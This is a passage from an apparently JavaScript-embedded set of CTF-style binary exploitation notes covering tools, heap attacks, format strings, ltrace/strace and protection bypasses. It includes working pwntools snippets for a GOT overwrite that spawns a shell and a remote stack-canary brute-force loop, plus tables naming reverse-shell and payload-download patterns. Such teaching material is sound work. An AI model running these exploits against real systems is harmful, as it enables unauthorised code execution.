\`\`\`bash
# Compile with NO protections (for practice)
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32

# 64-bit no protections
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie

# Set permissions for CTF-style challenges
sudo chown root:root flag.txt && sudo chmod 600 flag.txt
sudo chown root:root vuln && sudo chmod 4655 vuln

# Disable ASLR (for local testing)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
\`\`\`

---

## Quick Reference: Vulnerability → Technique

| Vulnerability | Protections | Technique |
|---|---|---|
| Stack BOF | None | ret2win / shellcode |
| Stack BOF | NX | ret2libc / ROP |
| Stack BOF | NX + ASLR | Leak libc → ret2libc |
| Stack BOF | NX + ASLR + PIE | Leak PIE base + libc → ROP |
| Stack BOF | NX + Canary | Leak/brute canary → ROP |
| Format String | Any | Arbitrary read/write → GOT overwrite |
| Heap Overflow | Any | Corrupt metadata → arbitrary write |
| Integer Overflow | Any | Trigger secondary vuln (BOF/heap) |

---

## References
- [HackTricks Binary Exploitation](https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html)
- [Crypto-Cat Binary Exploitation 101](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101) ([VIDEO Series](https://www.youtube.com/watch?v=wa3sMSdLyHw&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94))
- [Ir0nstone Notes](https://ir0nstone.gitbook.io/notes/types/stack)
- [Nightmare](https://guyinatuxedo.github.io/)
`},{id:`intro-to-buffer-overflows`,title:`Binary Exploitation 101 – Tools Setup & Key Commands`,excerpt:`Introduction to buffer overflow vulnerabilities including tool setup, essential GDB commands, and understanding memory corruption fundamentals.`,category:`Binary Exploitation`,content:`# Binary Exploitation 101 – Tools Setup & Key Commands
> Sources: [Crypto-Cat Binary Exploitation 101](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101) | [HackTricks](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)

---

## The Exploitation Workflow (Overview)

\`\`\`
1. RECON          →  file, checksec, strings, ltrace, strace
2. FIND VULN      →  Ghidra/IDA decompile, spot unsafe functions
3. FIND OFFSET    →  cyclic pattern (pwntools / msf-pattern)
4. CONTROL EIP    →  Overwrite return address
5. EXPLOIT        →  ret2win / shellcode / ret2libc / ROP
6. PROFIT         →  Shell / flag
\`\`\`

---

## Essential Tools & Commands

### checksec — Binary Protection Audit
\`\`\`bash
checksec --file=./binary          # Single binary
checksec --dir=.                  # All binaries in directory
\`\`\`

**Output explained:**
\`\`\`
    Arch:     amd64-64-little       ← Architecture
    RELRO:    Full RELRO            ← GOT is read-only (can't overwrite GOT)
    Stack:    Canary found          ← Stack canary present (detects overflow)
    NX:       NX enabled            ← Stack is non-executable (no shellcode)
    PIE:      PIE enabled           ← Binary base randomized (ASLR for code)
\`\`\`

| Protection | OFF = Easy Exploit | ON = Need Bypass |
|---|---|---|
| **NX** | Shellcode on stack | ROP / ret2libc |
| **Canary** | Direct overflow | Leak canary first |
| **PIE** | Fixed addresses | Leak binary base |
| **RELRO** | GOT overwrite | Target hooks/fini_array |
| **ASLR** | Fixed libc addr | Leak libc addr |

### file — Binary Identification
\`\`\`bash
file ./binary
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
\`\`\`

Key things to note:
- **32-bit vs 64-bit** → different calling conventions & register sizes
- **statically vs dynamically linked** → static = no libc GOT/PLT
- **stripped vs not stripped** → stripped = no symbol names in GDB

### strings / FLOSS — Extract Readable Strings
\`\`\`bash
strings ./binary                  # Basic ASCII strings
strings -n 8 ./binary            # Minimum 8 chars
floss ./binary                    # Deobfuscates encoded strings too
\`\`\`

Look for: function names, file paths, URLs, passwords, \`/bin/sh\`, \`flag\`, error messages.

### objdump — Quick Disassembly
\`\`\`bash
objdump -d ./binary               # Full disassembly
objdump -d ./binary | grep -A 20 '<main>'  # Just main
objdump -t ./binary               # Symbol table
objdump -R ./binary               # Dynamic relocations (GOT entries)
objdump -M intel -d ./binary      # Intel syntax
\`\`\`

### readelf — ELF Header Inspection
\`\`\`bash
readelf -h ./binary               # ELF header (entry point, arch)
readelf -S ./binary               # Section headers (.text, .got, .bss)
readelf -s ./binary               # Symbol table
readelf -l ./binary               # Program headers (segments)
readelf -d ./binary               # Dynamic section (shared libraries)
\`\`\`

### ROPgadget / ropper — Find ROP Gadgets
\`\`\`bash
ROPgadget --binary ./binary
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary --ropchain    # Auto-build execve chain

ropper --file ./binary
ropper --file ./binary --search "pop rdi; ret"
\`\`\`

### one_gadget — Libc One-Shot RCE
\`\`\`bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Returns addresses that give instant shell (if constraints met)
\`\`\`

### pwninit — Patch Binary with Correct Libc
\`\`\`bash
pwninit --bin ./vuln --libc ./libc.so.6
# Outputs: vuln_patched (uses correct libc + ld)
\`\`\`

### seccomp-tools — Sandbox Rule Inspection
\`\`\`bash
seccomp-tools dump ./binary
# Shows which syscalls are allowed/blocked
\`\`\`

### patchelf — Manually Set Libc/Linker
\`\`\`bash
patchelf --set-interpreter ./ld-2.27.so ./binary
patchelf --replace-needed libc.so.6 ./libc.so.6 ./binary
\`\`\`

---

## Compilation Flags for Practice

\`\`\`bash
# Everything OFF (easiest — start here)
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32

# 64-bit, no protections
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie

# NX on (need ROP, no shellcode)
gcc vuln.c -o vuln -fno-stack-protector -no-pie

# Everything ON (realistic)
gcc vuln.c -o vuln -fstack-protector-all -pie -z relro -z now

# Disable ASLR system-wide (for debugging)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
\`\`\`

---

## Quick Vulnerability Checklist

When you open a binary, ask:
1. **What does \`checksec\` show?** → Determines your exploit strategy
2. **Is there \`gets()\`, \`strcpy()\`, \`sprintf()\`, \`scanf("%s")\`?** → Buffer overflow
3. **Is there \`printf(user_input)\`?** → Format string vulnerability
4. **Is there \`free()\` without nulling pointer?** → Use-after-free
5. **Any interesting functions?** (\`win\`, \`flag\`, \`shell\`, \`system\`) → ret2win candidate
6. **Does it fork?** → Canary brute-force possible (same canary in child)

---

## References
- [Crypto-Cat Binary Exploitation 101 (11 videos)](https://youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec8)
- [Crypto-Cat CTF Pwn](https://github.com/Crypto-Cat/CTF/tree/main/pwn)
- [HackTricks Binary Exploitation](https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html)
- [Nightmare (guyinatuxedo)](https://guyinatuxedo.github.io/)
- [Ir0nstone Notes](https://ir0nstone.gitbook.io/notes)`},{id:`heap-exploitation`,title:`Heap Exploitation`,excerpt:`Heap exploitation techniques covering heap memory management, use-after-free, double-free, heap overflow, and tcache poisoning attacks.`,category:`Binary Exploitation`,content:`# Heap Exploitation
> Sources: [HackTricks - Libc Heap](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html) | [How2Heap](https://github.com/shellphish/how2heap)

---

## Heap Basics

The heap is dynamic memory allocated at runtime via \`malloc()\`, \`calloc()\`, \`realloc()\` and freed with \`free()\`.

\`\`\`c
char *ptr = malloc(0x20);  // Allocate 0x20 bytes on heap
strcpy(ptr, "hello");
free(ptr);                  // Return chunk to allocator
\`\`\`

### Memory Layout
\`\`\`
[ Text | Data | BSS | Heap →  ...  ← Stack ]
                      ↑ grows up    ↑ grows down
\`\`\`

---

## Chunk Structure (\`malloc_chunk\`)

\`\`\`c
struct malloc_chunk {
    size_t prev_size;    // Size of previous chunk (if free)
    size_t size;         // Size of this chunk + flags (3 LSBs)
    // --- user data starts here when allocated ---
    chunk* fd;           // Forward pointer (only when free)  
    chunk* bk;           // Backward pointer (only when free)
    chunk* fd_nextsize;  // Large bins only
    chunk* bk_nextsize;  // Large bins only
};
\`\`\`

### Size Field Flags (3 LSBs)
| Bit | Name | Meaning |
|---|---|---|
| 0x1 | \`PREV_INUSE\` | Previous chunk is allocated |
| 0x2 | \`IS_MMAPPED\` | Chunk obtained via \`mmap()\` |
| 0x4 | \`NON_MAIN_ARENA\` | Chunk from secondary arena |

### Allocated vs Free Chunk

**Allocated:**
\`\`\`
+------------------+
| prev_size        |  (or prev chunk's data)
+------------------+
| size      | A|M|P|
+------------------+
| user data        |
| ...              |
+------------------+
\`\`\`

**Free:**
\`\`\`
+------------------+
| prev_size        |
+------------------+
| size      | A|M|P|
+------------------+
| fd               |  → next free chunk
+------------------+
| bk               |  → prev free chunk
+------------------+
| (unused)         |
+------------------+
\`\`\`

---

## Bins (Free Chunk Storage)

When chunks are freed, they're placed in bins for reuse:

### Tcache Bins (glibc >= 2.26)
- **Per-thread** cache, fastest allocation
- 64 singly-linked lists (sizes 0x20 to 0x410 on x64)
- Max **7 chunks** per bin
- **LIFO** (Last In, First Out)
- Minimal security checks (exploit-friendly)

### Fast Bins
- Sizes: 0x20 to 0x80 (x64)
- **Singly-linked** (LIFO), never coalesced
- Chunks NOT marked as free (\`PREV_INUSE\` stays set)
- Filled after tcache is full

### Unsorted Bin
- **Single** doubly-linked list
- "Staging area" — freed chunks land here first (if not tcache/fastbin)
- On next \`malloc()\`, chunks sorted into small/large bins or reused

### Small Bins
- 62 doubly-linked lists
- Sizes: 0x20 to 0x3F0 (x64)
- **FIFO** (First In, First Out)
- Exact size match

### Large Bins
- 63 doubly-linked lists
- Sizes > 0x3F0 (x64)
- Sorted by size within each bin
- Best-fit allocation

---

## Common Heap Attacks

### Use-After-Free (UAF)
Accessing memory after \`free()\`. If chunk is reallocated, attacker controls data.

\`\`\`c
char *a = malloc(0x20);
free(a);           // 'a' is freed but pointer still exists
char *b = malloc(0x20);  // b gets same chunk as 'a'
// Writing to 'a' now overwrites 'b's data
\`\`\`

### Double Free
Freeing same chunk twice → appears in free list twice → two allocations return same chunk.

\`\`\`c
free(a);
free(b);  // or something else to avoid glibc double-free check
free(a);  // 'a' in free list twice
// Now malloc() returns 'a' twice → overlapping chunks
\`\`\`

**Tcache Double Free** (glibc < 2.29): No key check, trivial.
**Tcache Double Free** (glibc >= 2.29): Tcache adds a \`key\` field; must overwrite it.

### Heap Overflow
Overflowing from one chunk into adjacent chunk's metadata.

### Fastbin Dup / Tcache Poisoning
Corrupt \`fd\` pointer of free chunk → next allocation at arbitrary address.

\`\`\`python
# Tcache poisoning (simplified)
# 1. Free chunk A → tcache: A
# 2. Overwrite A->fd to point to target 
# 3. malloc() → returns A
# 4. malloc() → returns TARGET (arbitrary write!)
\`\`\`

### Unlink Attack
Corrupt \`fd\`/\`bk\` of a chunk to get arbitrary write during \`unlink()\`.
Modern glibc has safety checks: \`P->fd->bk == P && P->bk->fd == P\`

### House Techniques

| Technique | Target | Condition |
|---|---|---|
| **House of Force** | Top chunk | Overflow into top chunk size |
| **House of Spirit** | Fastbin/Tcache | Forge fake chunk, free it |
| **House of Lore** | Small bin | Corrupt \`bk\` pointer |
| **House of Einherjar** | Backward consolidation | Off-by-one null byte |
| **House of Orange** | \`_IO_FILE\` / unsorted bin | No \`free()\` needed |
| **House of Roman** | Partial overwrite | No leak needed |
| **House of Rabbit** | Fastbin consolidation | Corrupt fastbin fd |

---

## Useful GDB Commands (with pwndbg/GEF)

\`\`\`bash
# Inspect heap state
heap                  # Overview of all chunks
bins                  # Show all bins (tcache, fast, unsorted, small, large)
vis_heap_chunks       # Visual representation
tcachebins            # Tcache specifically
fastbins             
smallbins

# Inspect specific chunk
heap chunk <addr>
malloc_chunk <addr>

# Track allocations
# set breakpoints on malloc/free
b *malloc
b *free
\`\`\`

---

## Key glibc Version Changes

| Version | Change |
|---|---|
| 2.26 | Tcache introduced |
| 2.29 | Tcache key (double-free check) |
| 2.32 | Tcache fd pointer **PROTECT_PTR** (XOR with heap addr >> 12) |
| 2.34 | \`__malloc_hook\` / \`__free_hook\` **removed** |
| 2.35+ | Further hardening of pointer mangling |

---

## References
- [HackTricks Libc Heap](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html)
- [HackTricks Bins & Allocations](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/bins-and-memory-allocations.html)
- [How2Heap](https://github.com/shellphish/how2heap)
- [Azeria Labs Heap Part 1](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)
- [Azeria Labs Heap Part 2](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
- [Nightmare Heap](https://guyinatuxedo.github.io/25-heap/index.html)
`},{id:`format-strings`,title:`Format String Vulnerabilities`,excerpt:`Format string vulnerability exploitation including reading from and writing to arbitrary memory addresses using printf format specifiers.`,category:`Binary Exploitation`,content:`# Format String Vulnerabilities
> Sources: [HackTricks - Format Strings](https://book.hacktricks.wiki/en/binary-exploitation/format-strings/index.html) | [Crypto-Cat: Format String Vulns](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/07-format_string_vulns)

---

## What is a Format String Vulnerability?

Occurs when user input is passed directly as a format string to \`printf()\`, \`sprintf()\`, \`fprintf()\`, etc.

\`\`\`c
// VULNERABLE
printf(user_input);

// SAFE
printf("%s", user_input);
\`\`\`

---

## Format Specifiers Reference

\`\`\`
%x    — hex (4 bytes on 32-bit)
%08x  — hex padded to 8 chars
%p    — pointer (hex with 0x prefix)
%d    — signed decimal
%u    — unsigned decimal
%s    — string (dereference pointer, print until NULL)
%n    — WRITE number of bytes printed so far to address
%hn   — write 2 bytes (half word)
%hhn  — write 1 byte
%<n>$x — direct parameter access (e.g., %6$x = 6th param)
\`\`\`

---

## Exploitation: Arbitrary Read

### Leaking Stack Values
\`\`\`bash
# Leak values off the stack
echo 'AAAA.%x.%x.%x.%x.%x.%x.%x.%x' | ./vuln

# Direct access - leak the Nth param
echo '%6$x' | ./vuln
\`\`\`

### Leaking Arbitrary Addresses (read memory)
\`\`\`python
from pwn import *

p = process('./vuln')

# Read string at address 0x8048000
payload = b'%6$s'          # 4th param (account for padding)
payload += b'xxxx'          # padding to align
payload += p32(0x8048000)   # 6th param = target address

p.sendline(payload)
print(p.clean())
\`\`\`

### Finding Your Offset
\`\`\`bash
# Send 'AAAA' and find where it appears
echo 'AAAA%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x' | ./vuln
# Look for 41414141 in output — that's your offset
\`\`\`

---

## Exploitation: Arbitrary Write

### The \`%n\` Write Primitive
\`%n\` writes the number of bytes printed so far to the address pointed to by the parameter.

\`\`\`
AAAA%.6000d%4$n  → writes 6004 to address at 4th param
\`\`\`

### Writing Specific Values (2 bytes at a time with \`%hn\`)
Since writing huge numbers byte-by-byte is impractical, use \`%hn\` to write 2 bytes at a time:

\`\`\`
HOB = High Order Bytes (upper 2 bytes of target value)
LOB = Low Order Bytes  (lower 2 bytes of target value)

If HOB < LOB:
  [addr+2][addr]%.[HOB-8]x%[offset]$hn%.[LOB-HOB]x%[offset+1]$hn

If HOB > LOB:
  [addr+2][addr]%.[LOB-8]x%[offset+1]$hn%.[HOB-LOB]x%[offset]$hn
\`\`\`

---

## Pwntools Automation

### GOT Overwrite (replace \`printf\` → \`system\`)
\`\`\`python
from pwn import *

elf = context.binary = ELF('./vuln')
libc = elf.libc
libc.address = 0xf7dc2000  # if ASLR disabled

p = process()

# fmtstr_payload(offset, {target_addr: value_to_write})
payload = fmtstr_payload(5, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)
p.clean()

p.sendline('/bin/sh')
p.interactive()
\`\`\`

### Generic Format String Leak Script
\`\`\`python
from pwn import *

# Crypto-Cat's format string flag leak script
def leak_stack(p, offset_start=1, offset_end=50):
    for i in range(offset_start, offset_end):
        p = process('./vuln')
        p.sendline(f'%{i}$p'.encode())
        result = p.recvline()
        print(f"Offset {i}: {result}")
        p.close()
\`\`\`

---

## Common Targets for Writes

| Target | Purpose |
|---|---|
| GOT entry of \`printf\`/\`puts\` | Redirect to \`system()\` |
| GOT entry of \`exit\` | Loop back to vulnerable function |
| \`.fini_array\` | Execute on program exit |
| Return address on stack | Direct control flow hijack |
| Stack canary location | Bypass canary check |

---

## Useful Reads
- Leak **canary** → bypass stack protection
- Leak **libc address** from GOT → defeat ASLR
- Leak **PIE base** → defeat PIE
- Leak **stack address** → find buffer location for shellcode

---

## References
- [HackTricks Format Strings](https://book.hacktricks.wiki/en/binary-exploitation/format-strings/index.html)
- [Crypto-Cat: Format String Vulns](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/07-format_string_vulns)
- [Crypto-Cat: Overwriting GOT](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/09-overwriting_got)
- [Ir0nstone: Format Strings](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
- [Crypto-Cat: fstring_leak_flag.py](https://github.com/Crypto-Cat/CTF/blob/main/pwn/fstring_leak_flag.py)
`},{id:`ltracestrace`,title:`Dynamic Tracing: ltrace & strace`,excerpt:`Dynamic analysis using ltrace and strace to trace library calls and system calls, revealing runtime behavior of binary executables.`,category:`Binary Exploitation`,content:`# Dynamic Tracing: ltrace & strace
> Sources: [HackTricks - Reversing Tools](https://book.hacktricks.wiki/en/reversing/reversing-tools-basic-methods/index.html) | [Crypto-Cat CTF](https://github.com/Crypto-Cat/CTF)

---

## ltrace — Library Call Tracer

Intercepts and records **library function calls** (libc, etc.) made by a process.

### Basic Usage
\`\`\`bash
ltrace ./binary                   # Trace all library calls
ltrace -i ./binary                # Show instruction pointer
ltrace -e strcmp ./binary          # Filter: only strcmp calls
ltrace -e strcmp+strlen ./binary   # Filter: multiple functions
ltrace -s 200 ./binary            # Show 200 chars of strings (default=32)
ltrace -o output.txt ./binary     # Save output to file
ltrace -p <PID>                   # Attach to running process
ltrace -C ./binary                # Demangle C++ names
ltrace -f ./binary                # Follow forked children
\`\`\`

### What to Look For in Malware/CTF Analysis

| Library Call | What It Reveals |
|---|---|
| \`strcmp("password", user_input)\` | Hardcoded password comparison! |
| \`strncmp(buf, "FLAG{", 5)\` | Flag format check |
| \`fopen("/etc/shadow", "r")\` | Credential access attempt |
| \`system("wget http://...")\` | Second-stage download |
| \`dlopen("libevil.so")\` | Dynamic library loading |
| \`connect(fd, ...)\` | Network connection |
| \`getenv("SECRET_KEY")\` | Environment variable check |
| \`rand()\` / \`srand(seed)\` | Predictable RNG (brute-forceable) |

### Example: Cracking a Password Check
\`\`\`bash
$ ltrace ./crackme
puts("Enter password: ")                              = 17
fgets("hunter2\\n", 256, 0x7f...)                      = 0x7ffd...
strcmp("s3cr3t_p4ss!", "hunter2\\n")                    = -1
puts("Wrong!")                                         = 7

# Password leaked: s3cr3t_p4ss!
\`\`\`

### Example: Seeing Encryption Keys
\`\`\`bash
$ ltrace -s 100 ./encryptor flag.txt
fopen("flag.txt", "r")                                = 0x55a...
fread("HTB{this_is_the_flag}", 1, 1024, 0x55a...)     = 21
srand(1337)                                            = 0
rand()                                                 = 846930886
# Now you know the seed → can reproduce the entire key stream
\`\`\`

---

## strace — System Call Tracer

Intercepts and records **kernel system calls** made by a process.

### Basic Usage
\`\`\`bash
strace ./binary                   # Trace all syscalls
strace -e trace=open ./binary     # Filter: only open() calls
strace -e trace=network ./binary  # Filter: all network syscalls
strace -e trace=file ./binary     # Filter: all file operations
strace -e trace=process ./binary  # Filter: fork, exec, exit, etc.
strace -e trace=memory ./binary   # Filter: mmap, brk, mprotect
strace -f ./binary                # Follow forked children
strace -p <PID>                   # Attach to running process
strace -o output.txt ./binary     # Save output to file
strace -c ./binary                # Summary: syscall count + time
strace -t ./binary                # Timestamps
strace -T ./binary                # Time spent in each syscall
strace -y ./binary                # Decode file descriptors → paths
\`\`\`

### Syscall Categories (Filters)

| Filter | Syscalls Included | Use Case |
|---|---|---|
| \`trace=file\` | open, stat, chmod, unlink, rename | What files does it touch? |
| \`trace=network\` | socket, connect, bind, sendto, recvfrom | C2 communication |
| \`trace=process\` | clone, fork, execve, wait, kill | Process creation/injection |
| \`trace=memory\` | mmap, mprotect, brk, munmap | RWX memory (shellcode?) |
| \`trace=signal\` | signal, sigaction, kill | Signal handling |
| \`trace=ipc\` | shmget, semop, msgget | Inter-process communication |

### What to Look For

| Syscall Pattern | Meaning |
|---|---|
| \`openat(AT_FDCWD, "/etc/passwd")\` | Reading system files |
| \`connect(3, {sa_family=AF_INET, sin_port=htons(4444)})\` | Reverse shell / C2 |
| \`mprotect(0x7f..., 4096, PROT_READ\\|PROT_WRITE\\|PROT_EXEC)\` | Making memory executable (shellcode) |
| \`execve("/bin/sh", ["/bin/sh", "-c", "..."])\` | Spawning shell |
| \`ptrace(PTRACE_TRACEME)\` | Anti-debugging (if fails = being debugged) |
| \`unlink("/tmp/malware")\` | Self-deletion |
| \`clone(child_stack=...)\` | Creating threads / forking |

### Example: Spotting Anti-Debugging
\`\`\`bash
$ strace ./malware 2>&1 | grep ptrace
ptrace(PTRACE_TRACEME, ...)      = -1 EPERM (Operation not permitted)
# Binary detected it's being traced and will exit or change behavior
\`\`\`

### Example: Tracking File Drops
\`\`\`bash
$ strace -e trace=file -y ./dropper 2>&1 | grep -i "creat\\|open.*W\\|unlink"
openat(AT_FDCWD, "/tmp/.hidden_payload", O_WRONLY|O_CREAT) = 4
# Malware dropping payload to /tmp/.hidden_payload
\`\`\`

---

## ltrace vs strace — When to Use Which

| Scenario | Use |
|---|---|
| Crackme / password check | **ltrace** (shows \`strcmp\`, \`strncmp\`) |
| What files does malware access? | **strace** (\`-e trace=file\`) |
| What network connections? | **strace** (\`-e trace=network\`) |
| What libraries/APIs called? | **ltrace** |
| Does it execute other programs? | **strace** (\`-e trace=process\`) |
| Anti-debug detection? | **strace** (shows \`ptrace\` calls) |
| Static binary (no dynamic libs)? | **strace** only (ltrace won't work) |

---

## Pro Tips

\`\`\`bash
# Combine both for full visibility
ltrace -o ltrace.log ./binary &
strace -o strace.log -p $!

# Run binary with ltrace and pipe password
echo "test_password" | ltrace -s 200 ./crackme

# Compare behavior with/without debug
strace -c ./binary              # Normal run timing
strace -c gdb -batch ./binary   # Under GDB — detect anti-debug timing gaps
\`\`\`

---

## References
- [HackTricks - Reversing Tools & Methods](https://book.hacktricks.wiki/en/reversing/reversing-tools-basic-methods/index.html)
- [Crypto-Cat Binary Exploitation Setup](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/00-intro)
- \`man ltrace\`, \`man strace\``},{id:`binary-protections-bypasses`,title:`Binary Protections & Bypasses`,excerpt:`Overview of binary security protections including NX, stack canaries, PIE, RELRO, and ASLR along with techniques to bypass each protection.`,category:`Binary Exploitation`,content:`# Binary Protections & Bypasses
> Sources: [HackTricks - Protections](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html) | [Crypto-Cat Binary Exploitation 101](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101)

---

## Quick Check: \`checksec\`

\`\`\`bash
checksec --file=./binary
\`\`\`

\`\`\`
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
\`\`\`

---

## Protection: NX / DEP (No-Execute)

**What:** Stack/heap marked non-executable. Can't run shellcode on the stack.

**Bypass:**
- ROP (Return Oriented Programming) — chain gadgets from executable \`.text\` section
- ret2libc — call existing functions like \`system()\`
- \`mprotect()\` via ROP → make a region executable, then jump to shellcode

\`\`\`bash
# Compile WITHOUT NX (for practice)
gcc -z execstack vuln.c -o vuln
\`\`\`

---

## Protection: ASLR (Address Space Layout Randomization)

**What:** Randomizes base addresses of stack, heap, libraries on each execution. Kernel-level.

**Bypass:**
- **Leak addresses** — use format strings, puts/printf of GOT entries
- **Brute force** — on 32-bit, only ~12 bits of entropy (4096 possibilities)
- **Partial overwrite** — overwrite only lowest 1-2 bytes (which don't change)
- **ret2plt** — PLT addresses are fixed when PIE is off
- **Ret2vsyscall** — vsyscall page is at a fixed address on older kernels

\`\`\`bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0=off, 1=partial, 2=full

# Disable ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
\`\`\`

---

## Protection: PIE (Position Independent Executable)

**What:** Randomizes the base address of the binary itself (not just libraries).

**Bypass:**
- **Leak binary address** — partial overwrite, format string leak
- **Brute force** — 32-bit has limited entropy
- **Partial overwrite** — last 12 bits (3 hex chars) are always the same

\`\`\`bash
# Compile WITHOUT PIE
gcc -no-pie vuln.c -o vuln
\`\`\`

---

## Protection: Stack Canary

**What:** Random value placed between local variables and saved return address. Checked before function return — if modified, program calls \`__stack_chk_fail\`.

**Bypass:**
- [Crypto-Cat: Bypassing Canaries](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/10-bypassing_canaries)
- **Leak canary** via format string (\`%p\`, \`%x\`) or other info leak
- **Brute force** byte-by-byte (fork-based servers share same canary)
- **Overwrite \`__stack_chk_fail\` GOT** → redirect to continue execution
- **Thread canary** — canary stored in TLS, can sometimes be overwritten via heap

\`\`\`python
# Brute force canary (fork-based server)
canary = b'\\x00'  # Canaries start with null byte
for i in range(7):
    for byte in range(256):
        p = remote(host, port)
        payload = b'A' * offset + canary + bytes([byte])
        p.send(payload)
        response = p.recv(timeout=1)
        if b"stack smashing" not in response:
            canary += bytes([byte])
            break
        p.close()
\`\`\`

---

## Protection: RELRO (Relocation Read-Only)

**What:** Controls writability of GOT.

| Level | GOT Writable? | Exploit Impact |
|---|---|---|
| No RELRO | Yes | GOT overwrite easy |
| Partial RELRO | Yes (GOT still writable) | GOT overwrite works |
| Full RELRO | No (GOT is read-only) | Cannot overwrite GOT — target \`.fini_array\`, \`__malloc_hook\`, \`__free_hook\`, etc. |

**Bypass Full RELRO:**
- Overwrite \`__malloc_hook\` or \`__free_hook\` (older glibc)
- Overwrite \`.fini_array\`
- Overwrite return address on stack (if you can find it)
- Overwrite function pointers in data sections

---

## Protection: Fortify Source

**What:** Compile-time replacement of unsafe functions (\`strcpy\` → \`__strcpy_chk\`) with bounds-checked versions.

**Bypass:** Hard — these are compile-time checks. Find other vulns.

---

## Protection: CET & Shadow Stack

**What:** Hardware-assisted (Intel CET). Maintains a shadow copy of return addresses. Any mismatch = crash.

**Bypass:** 
- JOP (Jump Oriented Programming) instead of ROP
- Very difficult to bypass when properly implemented

---

## Core Dumps for Debugging

\`\`\`bash
# Enable core dumps
ulimit -c unlimited

# Permanent (add to /etc/security/limits.conf)
* soft core unlimited

# Analyze core dump
gdb /path/to/binary /path/to/core
\`\`\`

---

## Summary Cheat Sheet

| Protection | Check | Bypass Strategy |
|---|---|---|
| NX | \`checksec\` | ROP, ret2libc |
| ASLR | \`cat /proc/sys/kernel/randomize_va_space\` | Leak → calculate base |
| PIE | \`checksec\` | Leak binary addr, partial overwrite |
| Canary | \`checksec\` | Leak or brute-force |
| Full RELRO | \`checksec\` | Target hooks/fini_array instead of GOT |

---

## References
- [HackTricks Protections](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)
- [HackTricks ASLR](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/aslr/index.html)
- [HackTricks PIE](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/pie/index.html)
- [HackTricks Canaries](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/stack-canaries/index.html)
- [Crypto-Cat: Bypassing Canaries](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/10-bypassing_canaries)
- [Crypto-Cat: Leak PIE + Ret2libc](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/08-leak_pie_ret2libc)
`},{id:`stack`,title:`STACK`,excerpt:`Understanding the call stack architecture including stack frames, registers (EBP, ESP, EIP), function prologues and epilogues, and stack-based memory layout.`,category:`Binary Exploitation`,content:`### What is the Stack?

The **call stack** (or just "stack") is a special region of a program's memory used for managing function calls and local (temporary) data. It's like a stack of plates: you **push** new items on top when entering a function, and **pop** them off when exiting. This ensures everything happens in the correct order (last in, first out – LIFO).

The stack handles:

- Local variables (e.g., buffers, ints in a function)
- Function parameters (in older calling conventions)
- Saved registers
- Return address (where to go back after the function finishes)

It's fast because it's managed automatically by the CPU instructions (like push, pop, call, ret on x86).

### Why the Stack Grows Downwards

In most architectures (including x86/x86_64 on Linux/Kali), the stack starts at **high memory addresses** and grows **towards lower addresses** (downwards).

Reason:

- The program's code, data, and heap (dynamic memory from malloc) start at **low addresses** and grow **upwards**.
- This leaves a big empty space in the middle for both to expand freely without fixed limits.

![linux - Do memory mapping segment and heap grow until they meet ...](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyW3rDhDVTKj5Q3OhXGyxeUBxtKqQcFmtb9R6xLXXimcaxpWJx&s)


![In-Memory Layout of a Program (Process) « Gabriele Tolomei](https://gabrieletolomei.wordpress.com/wp-content/uploads/2013/10/memory_layout.jpg)

![memory management - Stack and Heap locations in RAM - Stack Overflow](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRH1WTpnOKriohmPu8bbDv6dOdoKMmOprfcm2Wv2KSTahRkPKQ&s)

[stackoverflow.com](https://stackoverflow.com/questions/32418750/stack-and-heap-locations-in-ram)

![How Does Linux Memory Work?. Similar to CPU management, memory ...](https://miro.medium.com/v2/resize:fit:1400/1*CHCagIJgUkFZyL49a9td-g.png)



Typical Linux process virtual memory layout: Code/data at bottom (growing ↑), stack at top (growing ↓), heap in between.

### Key Registers Involved (x86 32-bit Example)

